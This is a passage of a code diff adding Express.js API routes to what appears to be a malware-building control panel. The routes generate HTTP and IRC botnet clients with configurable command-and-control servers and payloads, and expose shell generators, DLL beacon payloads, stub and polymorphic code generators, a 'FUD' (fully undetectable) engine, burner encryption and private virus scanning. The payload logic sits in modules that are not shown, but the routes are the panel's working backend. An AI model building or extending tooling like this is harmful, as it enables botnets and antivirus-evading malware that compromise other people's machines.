+        let payloadData = null;
+        if (userPayloadId) {
+            const userId = req.headers['x-user-id'] || 'anonymous';
+            const userPayloadList = userPayloads.get(userId) || [];
+            const userPayload = userPayloadList.find(p => p.id === userPayloadId);
+            if (userPayload) {
+                payloadData = userPayload.content;
+            }
+        } else if (payloadUrl) {
+            // Download from URL
+            
+            const parsedUrl = urlModule.parse(payloadUrl);
+            const client = parsedUrl.protocol === 'https:' ? https : http;
+            
+            const downloadPromise = new Promise((resolve, reject) => {
+                client.get(payloadUrl, (response) => {
+                    if (response.statusCode !== 200) {
+                        reject(new Error(`HTTP ${response.statusCode}`));
+                        return;
+                    }
+                    
+                    const chunks = [];
+                    response.on('data', chunk => chunks.push(chunk));
+                    response.on('end', () => resolve(Buffer.concat(chunks)));
+                    response.on('error', reject);
+                }).on('error', reject);
+            });
+            
+            payloadData = await downloadPromise;
+        } else if (userPayload) {
+            payloadData = Buffer.from(userPayload, 'utf8');
+        }
+        
+        const platforms = [primaryProtocol];
+        if (fallbackProtocol !== primaryProtocol) {
+            platforms.push(fallbackProtocol);
+        }
+        
+        const options = {
+            httpConfig: httpServer ? {
+                serverUrl: httpServer,
+                encryption: encryption
+            } : null,
+            ircConfig: ircServer ? {
+                serverHost: ircServer,
+                serverPort: ircPort,
+                channels: ircChannels,
+                encryption: encryption
+            } : null,
+            features: features,
+            language: language,
+            architecture: architecture,
+            customPayload: payloadData ? payloadData.toString('utf8') : null
+        };
+        
+        const result = await realModules.multiPlatformBotGenerator.generateMultiPlatformBot(platforms, options);
+        
+        res.json({ 
+            success: true, 
+            result,
+            config: {
+                primaryProtocol,
+                fallbackProtocol,
+                httpServer,
+                httpPort,
+                httpAuthToken,
+                ircServer,
+                ircPort,
+                ircNickname,
+                ircChannels,
+                ircPassword,
+                ircSSL,
+                failoverTimeout,
+                retryAttempts,
+                healthCheckInterval,
+                features,
+                language,
+                architecture,
+                encryption
+            }
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Utility function for content types
+function getContentType(format) {
+    const contentTypes = {
+        'cpp': 'text/x-c++src',
+        'cs': 'text/x-csharp',
+        'py': 'text/x-python',
+        'js': 'application/javascript',
+        'ps1': 'application/x-powershell',
+        'bat': 'application/x-msdos-program',
+        'exe': 'application/x-msdownload',
+        'dll': 'application/x-msdownload',
+        'so': 'application/x-sharedlib',
+        'dylib': 'application/x-mach-binary',
+        'asm': 'text/x-asm',
+        'patch': 'text/x-patch',
+        'raw': 'application/octet-stream'
+    };
+    return contentTypes[format] || 'application/octet-stream';
 }
+
+// Additional API endpoints for complete functionality
+app.get('/api/engines/available', requireAuth, async (_req, res) => {
+    try {
+        const availableEngines = Object.keys(realModules).map(engineName => ({
+            name: engineName,
+            status: 'available',
+            endpoints: [
+                `/api/${engineName}/status`,
+                `/api/${engineName}/initialize`
+            ]
+        }));
+        res.json({ success: true, engines: availableEngines });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// Engine-specific endpoints for engines that might be missing them
+app.post('/api/red-killer/scan', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        // Apply red team configuration defaults
+        const redTeamOptions = {
+            timeout: options.timeout || config.engines.redTeam.operationTimeout,
+            stealthMode: options.stealthMode !== undefined ? options.stealthMode : config.engines.redTeam.stealthMode,
+            logLevel: options.logLevel || config.engines.redTeam.logLevel,
+            ...options
+        };
+        
+        const result = await realModules.redKiller.scanTarget(target, redTeamOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/red-shells/generate', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.redShells.generateShell(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/beaconism-dll/generate', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.beaconismDLL.generatePayload(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/reverse-engineering/analyze', requireAuth, async (req, res) => {
+    try {
+        const { filepath, options = {} } = req.body || {};
+        if (!filepath) {
+            return res.status(400).json({ error: 'filepath is required' });
+        }
+        const result = await realModules.reverseEngineering.analyze(filepath, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Network Tools Endpoints
+app.post('/api/network-tools/analyze', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        // Apply configuration defaults
+        const networkOptions = {
+            timeout: options.timeout || config.engines.networkTools.defaultTimeout,
+            maxConcurrentScans: options.maxConcurrentScans || config.engines.networkTools.maxConcurrentScans,
+            scanDelay: options.scanDelay || config.engines.networkTools.scanDelay,
+            ...options
+        };
+        
+        const result = await realModules.networkTools.analyzeNetwork(target, networkOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/network-tools/port-scan', requireAuth, async (req, res) => {
+    try {
+        const { target, ports, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        // Use default ports if none specified
+        const portsToScan = ports || config.engines.networkTools.defaultPorts.split(',');
+        
+        // Apply configuration defaults
+        const networkOptions = {
+            timeout: options.timeout || config.engines.networkTools.defaultTimeout,
+            scanDelay: options.scanDelay || config.engines.networkTools.scanDelay,
+            ...options
+        };
+        
+        const result = await realModules.networkTools.portScan(target, portsToScan, networkOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/network-tools/dns-lookup', requireAuth, async (req, res) => {
+    try {
+        const { hostname, recordType = 'A', options = {} } = req.body || {};
+        if (!hostname) {
+            return res.status(400).json({ error: 'hostname is required' });
+        }
+        
+        // Apply configuration defaults
+        const networkOptions = {
+            timeout: options.timeout || config.engines.networkTools.defaultTimeout,
+            ...options
+        };
+        
+        const result = await realModules.networkTools.dnsLookup(hostname, recordType, networkOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Mobile Tools Endpoints
+app.post('/api/mobile-tools/analyze-app', requireAuth, async (req, res) => {
+    try {
+        const { appPath, platform, options = {} } = req.body || {};
+        if (!appPath || !platform) {
+            return res.status(400).json({ error: 'appPath and platform are required' });
+        }
+        
+        // Validate platform against supported platforms
+        const supportedPlatforms = config.engines.mobileTools.supportedPlatforms.split(',');
+        if (!supportedPlatforms.includes(platform.toLowerCase())) {
+            return res.status(400).json({ 
+                error: `Unsupported platform: ${platform}. Supported platforms: ${supportedPlatforms.join(', ')}` 
+            });
+        }
+        
+        // Apply configuration defaults
+        const mobileOptions = {
+            timeout: options.timeout || config.engines.mobileTools.analysisTimeout,
+            maxFileSize: options.maxFileSize || config.engines.mobileTools.maxFileSize,
+            ...options
+        };
+        
+        const result = await realModules.mobileTools.analyzeApp(appPath, platform, mobileOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/mobile-tools/check-vulnerabilities', requireAuth, async (req, res) => {
+    try {
+        const { appPath, platform, options = {} } = req.body || {};
+        if (!appPath || !platform) {
+            return res.status(400).json({ error: 'appPath and platform are required' });
+        }
+        
+        // Validate platform against supported platforms
+        const supportedPlatforms = config.engines.mobileTools.supportedPlatforms.split(',');
+        if (!supportedPlatforms.includes(platform.toLowerCase())) {
+            return res.status(400).json({ 
+                error: `Unsupported platform: ${platform}. Supported platforms: ${supportedPlatforms.join(', ')}` 
+            });
+        }
+        
+        // Apply configuration defaults
+        const mobileOptions = {
+            timeout: options.timeout || config.engines.mobileTools.analysisTimeout,
+            maxFileSize: options.maxFileSize || config.engines.mobileTools.maxFileSize,
+            ...options
+        };
+        
+        const result = await realModules.mobileTools.checkAppVulnerabilities(appPath, platform, mobileOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Native Compiler Endpoints
+app.post('/api/native-compiler/compile-source', requireAuth, async (req, res) => {
+    try {
+        const { sourceCode, language, options = {} } = req.body || {};
+        if (!sourceCode || !language) {
+            return res.status(400).json({ error: 'sourceCode and language are required' });
+        }
+        
+        // Validate language against supported languages
+        const supportedLanguages = config.engines.nativeCompiler.supportedLanguages.split(',');
+        if (!supportedLanguages.includes(language.toLowerCase())) {
+            return res.status(400).json({ 
+                error: `Unsupported language: ${language}. Supported languages: ${supportedLanguages.join(', ')}` 
+            });
+        }
+        
+        // Apply configuration defaults
+        const compilerOptions = {
+            timeout: options.timeout || config.engines.nativeCompiler.maxCompilationTime,
+            tempDirectory: options.tempDirectory || config.engines.nativeCompiler.tempDirectory,
+            maxOutputSize: options.maxOutputSize || config.engines.nativeCompiler.maxOutputSize,
+            ...options
+        };
+        
+        const result = await realModules.nativeCompiler.compileSource(sourceCode, language, compilerOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/api/native-compiler/detect-compilers', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.nativeCompiler.detectCompilers();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Start server
+
+// Additional API endpoints for engines without dedicated endpoints
+
+// rawrzEngine API endpoints
+app.get('/api/rawrz-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/rawrz-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// rawrzEngine2 API endpoints
+app.get('/api/rawrz-engine2/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine2.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/rawrz-engine2/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.rawrzEngine2.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// httpBotGenerator API endpoints
+app.get('/api/http-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotGenerator.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/http-bot-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotGenerator.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// httpBotManager API endpoints
+app.get('/api/http-bot-manager/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotManager.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/http-bot-manager/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.httpBotManager.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// ircBotGenerator API endpoints
+app.get('/api/irc-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.ircBotGenerator.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/irc-bot-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.ircBotGenerator.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// multiPlatformBotGenerator API endpoints
+app.get('/api/multi-platform-bot-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.multiPlatformBotGenerator.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/multi-platform-bot-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.multiPlatformBotGenerator.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// hotPatchers API endpoints
+app.get('/api/hot-patchers/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.hotPatchers.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/hot-patchers/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.hotPatchers.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// digitalForensics API endpoints
+app.get('/api/digital-forensics/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.digitalForensics.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/digital-forensics/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.digitalForensics.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// jottiScanner API endpoints
+app.get('/api/jotti-scanner/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.jottiScanner.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/jotti-scanner/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.jottiScanner.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// privateVirusScanner API endpoints
+app.get('/api/private-virus-scanner/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.privateVirusScanner.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/private-virus-scanner/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.privateVirusScanner.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// burnerEncryption API endpoints
+app.get('/api/burner-encryption/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.burnerEncryption.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/burner-encryption/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.burnerEncryption.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// polymorphicEngine API endpoints
+app.get('/api/polymorphic-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.polymorphicEngine.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/polymorphic-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.polymorphicEngine.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// mutexEngine API endpoints
+app.get('/api/mutex-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mutexEngine.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/mutex-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mutexEngine.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// opensslManagement API endpoints
+app.get('/api/openssl-management/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/openssl-management/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// implementationChecker API endpoints
+app.get('/api/implementation-checker/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.implementationChecker.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/implementation-checker/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.implementationChecker.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// payloadManager API endpoints
+app.get('/api/payload-manager/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.payloadManager.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/payload-manager/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.payloadManager.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// advancedAnalyticsEngine API endpoints
+app.get('/api/advanced-analytics-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedAnalyticsEngine.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/advanced-analytics-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedAnalyticsEngine.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// advancedFUDEngine API endpoints
+app.get('/api/advanced-f-u-d-engine/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedFUDEngine.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/advanced-f-u-d-engine/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedFUDEngine.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// aiThreatDetector API endpoints
+app.get('/api/ai-threat-detector/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.aiThreatDetector.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/ai-threat-detector/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.aiThreatDetector.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// apiStatus API endpoints
+app.get('/api/api-status/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.apiStatus.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/api-status/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.apiStatus.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// backupSystem API endpoints
+app.get('/api/backup-system/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.backupSystem.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/backup-system/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.backupSystem.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// dualGenerators API endpoints
+app.get('/api/dual-generators/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.dualGenerators.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/dual-generators/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.dualGenerators.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// fullAssembly API endpoints
+app.get('/api/full-assembly/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.fullAssembly.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/full-assembly/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.fullAssembly.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// mobileTools API endpoints
+app.get('/api/mobile-tools/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mobileTools.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/mobile-tools/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mobileTools.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// nativeCompiler API endpoints
+app.get('/api/native-compiler/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.nativeCompiler.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/native-compiler/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.nativeCompiler.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// pluginArchitecture API endpoints
+app.get('/api/plugin-architecture/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.pluginArchitecture.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/plugin-architecture/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.pluginArchitecture.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// templateGenerator API endpoints
+app.get('/api/template-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.templateGenerator.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/template-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.templateGenerator.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// redKiller API endpoints
+app.get('/api/red-killer/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redKiller.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/red-killer/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redKiller.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// redShells API endpoints
+app.get('/api/red-shells/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redShells.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/red-shells/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redShells.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// reverseEngineering API endpoints
+app.get('/api/reverse-engineering/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.reverseEngineering.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/reverse-engineering/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.reverseEngineering.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// stubGenerator API endpoints
+app.get('/api/stub-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.stubGenerator.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/stub-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.stubGenerator.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// advancedStubGenerator API endpoints
+app.get('/api/advanced-stub-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedStubGenerator.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/advanced-stub-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedStubGenerator.initialize();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Hot Patchers specific endpoints
+app.post('/api/hot-patchers/patch', requireAuth, async (req, res) => {
+    try {
+        const { target, patch, options = {} } = req.body || {};
+        if (!target || !patch) {
+            return res.status(400).json({ error: 'target and patch are required' });
+        }
+        const result = await realModules.hotPatchers.applyPatch(target, patch, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/hot-patchers/analyze', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        const result = await realModules.hotPatchers.analyzeTarget(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Digital Forensics specific endpoints
+app.post('/api/digital-forensics/analyze', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        // Apply analysis configuration defaults
+        const analysisOptions = {
+            timeout: options.timeout || config.engines.analysis.maxAnalysisTime,
+            maxFileSize: options.maxFileSize || config.engines.analysis.maxFileSize,
+            tempDirectory: options.tempDirectory || config.engines.analysis.tempDirectory,
+            concurrentAnalyses: options.concurrentAnalyses || config.engines.analysis.concurrentAnalyses,
+            ...options
+        };
+        
+        const result = await realModules.digitalForensics.analyze(target, analysisOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Jotti Scanner specific endpoints
+app.post('/api/jotti-scanner/scan', requireAuth, async (req, res) => {
+    try {
+        const { filePath, options = {} } = req.body || {};
+        if (!filePath) {
+            return res.status(400).json({ error: 'filePath is required' });
+        }
+        const result = await realModules.jottiScanner.scanFile(filePath, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Private Virus Scanner specific endpoints
+app.post('/api/private-virus-scanner/scan', requireAuth, async (req, res) => {
+    try {
+        const { filePath, options = {} } = req.body || {};
+        if (!filePath) {
+            return res.status(400).json({ error: 'filePath is required' });
+        }
+        const result = await realModules.privateVirusScanner.scanFile(filePath, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Burner Encryption specific endpoints
+app.post('/api/burner-encryption/encrypt', requireAuth, async (req, res) => {
+    try {
+        const { data, options = {} } = req.body || {};
+        if (!data) {
+            return res.status(400).json({ error: 'data is required' });
+        }
+        
+        // Apply crypto configuration defaults
+        const cryptoOptions = {
+            algorithm: options.algorithm || config.engines.crypto.defaultAlgorithm,
+            keyDerivationRounds: options.keyDerivationRounds || config.engines.crypto.keyDerivationRounds,
+            maxKeySize: options.maxKeySize || config.engines.crypto.maxKeySize,
+            timeout: options.timeout || config.engines.crypto.encryptionTimeout,
+            ...options
+        };
+        
+        const result = await realModules.burnerEncryption.encrypt(data, cryptoOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/api/burner-encryption/decrypt', requireAuth, async (req, res) => {
+    try {
+        const { data, options = {} } = req.body || {};
+        if (!data) {
+            return res.status(400).json({ error: 'data is required' });
+        }
+        
+        // Apply crypto configuration defaults
+        const cryptoOptions = {
+            algorithm: options.algorithm || config.engines.crypto.defaultAlgorithm,
+            keyDerivationRounds: options.keyDerivationRounds || config.engines.crypto.keyDerivationRounds,
+            maxKeySize: options.maxKeySize || config.engines.crypto.maxKeySize,
+            timeout: options.timeout || config.engines.crypto.encryptionTimeout,
+            ...options
+        };
+        
+        const result = await realModules.burnerEncryption.decrypt(data, cryptoOptions);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Polymorphic Engine specific endpoints
+app.post('/api/polymorphic-engine/transform', requireAuth, async (req, res) => {
+    try {
+        const { code, options = {} } = req.body || {};
+        if (!code) {
+            return res.status(400).json({ error: 'code is required' });
+        }
+        const result = await realModules.polymorphicEngine.transformCode(code, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Mutex Engine specific endpoints
+app.post('/api/mutex-engine/create', requireAuth, async (req, res) => {
+    try {
+        const { name, options = {} } = req.body || {};
+        if (!name) {
+            return res.status(400).json({ error: 'name is required' });
+        }
+        const result = await realModules.mutexEngine.createMutex(name, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// OpenSSL Management specific endpoints
+app.post('/api/openssl-management/generate-key', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        const result = await realModules.opensslManagement.generateKey(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
